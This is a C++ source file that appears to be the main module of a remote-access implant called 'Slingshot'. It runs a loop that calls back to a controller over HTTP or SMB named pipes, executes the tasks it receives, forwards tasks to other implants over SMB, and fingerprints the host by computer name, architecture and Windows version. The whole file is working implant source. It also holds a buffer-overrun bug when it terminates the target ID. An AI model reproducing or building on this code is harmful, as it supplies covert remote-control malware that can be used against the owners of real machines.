#include "Core.h"
#include "HTTP.h"
#include "SMB.h"
#include "Tasking.h"

DWORD StartSlingshot() {
	
	State state = { 0 };
	state.running = TRUE;
	GetSystemInfoString(state);

#ifdef SMB
	if (!PrepareSMB(state))
		return FALSE;
#else
	if (!PrepareHTTP(state))
		return FALSE;
#endif

	if (!PrepareTasking(state))
		return FALSE;

	std::string inboundData = "";
	std::string outboundData = "";

	// Start primary loop
	while (state.running) {

#ifdef SMB
		inboundData = PerformSMBCallback(state, outboundData);
#else
		inboundData = PerformHTTPCallback(state, outboundData);
#endif

		if (inboundData.length() > 0) {
			
			// Check if we need to forward this packet via SMB
			std::string smbIP = GetForwardingTarget(inboundData);
			if (smbIP.length() > 0) {
				if (!ForwardTasking(smbIP, inboundData, outboundData, state)) {

					TaskingData tData = DeserializeData(inboundData);

					if (tData.taskCode != Task_Exit) {
						ResponseData rData;
						rData.returnCode = SMB_SpecialByte;
						rData.taskID = tData.taskID;
						outboundData = SerializeData(rData, state);
					}
				}		
			}
			else {
				outboundData = ExecuteTasking(state, inboundData);
			}	
		}
		else {
			outboundData = CheckForOutput(state);
		}
	}

#ifdef SMB
	if ( state.smbState.hInboundPipe ) {
		DisconnectNamedPipe (state.smbState.hInboundPipe);
		CloseHandle (state.smbState.hInboundPipe);
	}
#endif
	
	return TRUE;
}

typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);

void GetSystemInfoString(State & state) {

	// Get computer name
	DWORD nameSize = 255;
	GetComputerNameA(state.hostInfo.computerName, &nameSize);

	// Get system architecture
	BOOL bIsWow64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &bIsWow64);
	if (bIsWow64 == TRUE)
		state.hostInfo.architecture = "SysWoW64";
	else {
		SYSTEM_INFO sysInfo;
		ZeroMemory(&sysInfo, sizeof(SYSTEM_INFO));
		GetNativeSystemInfo(&sysInfo);
		if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
			state.hostInfo.architecture = "x64";
		else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
			state.hostInfo.architecture = "x86";
	}

	// Get Windows version
	RTL_OSVERSIONINFOEXW osVers = { 0 };
	osVers.dwOSVersionInfoSize = sizeof(osVers);
	RtlGetVersionPtr getVersion = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
	if (getVersion)
		getVersion(&osVers);

	if (osVers.wProductType == VER_NT_WORKSTATION)
		_snprintf_s(state.hostInfo.windowsVersion, 8, "%d.%d0", osVers.dwMajorVersion, osVers.dwMinorVersion);
	else
		_snprintf_s(state.hostInfo.windowsVersion, 8, "%d.%d1", osVers.dwMajorVersion, osVers.dwMinorVersion);

	// Build target identifier
	srand((UINT)time(NULL));
	for (int i = 0; i < sizeof(state.targetID); ++i)
		state.targetID[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	state.targetID[sizeof(state.targetID)] = '\0';
}

std::string GetTargetInfo(State & state) {
	std::string targetInfo;

	// Use some additional random data to avoid any caching issues
	char randomData[6];
	for (int i = 0; i < sizeof(randomData); ++i)
		randomData[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	randomData[sizeof(randomData) - 1] = '\0';

	targetInfo += std::string(randomData) + "|";
	targetInfo += std::string(state.targetID) + "|";
	targetInfo += std::string(state.hostInfo.windowsVersion) + "|";
	targetInfo += std::string(state.hostInfo.computerName) + "|";
	targetInfo += std::string(state.hostInfo.architecture) + "|";

#ifdef SMB
	targetInfo += "SMB";
#else
	targetInfo += "HTTP";
#endif

	return targetInfo;
}